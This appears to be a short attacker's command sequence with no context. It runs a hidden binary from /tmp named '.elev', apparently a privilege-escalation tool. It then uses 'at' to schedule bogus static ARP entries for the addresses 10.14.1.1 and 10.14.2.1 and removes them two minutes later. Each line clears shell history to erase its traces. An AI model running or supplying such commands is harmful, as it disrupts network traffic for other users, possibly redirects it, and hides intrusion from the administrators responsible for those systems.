cd / && /tmp/./.elev
echo "arp -s 10.14.1.1 AA:AA:AA:AA:AA:AA" | at -m now + 2 minute && echo "arp -d 10.14.1.1" | at -m now + 4 minute && history -c

echo "arp -s 10.14.2.1 AA:AA:AA:AA:AA:AA" | at -m now + 2 minute && echo "arp -d 10.14.2.1" | at -m now + 4 minute && history -c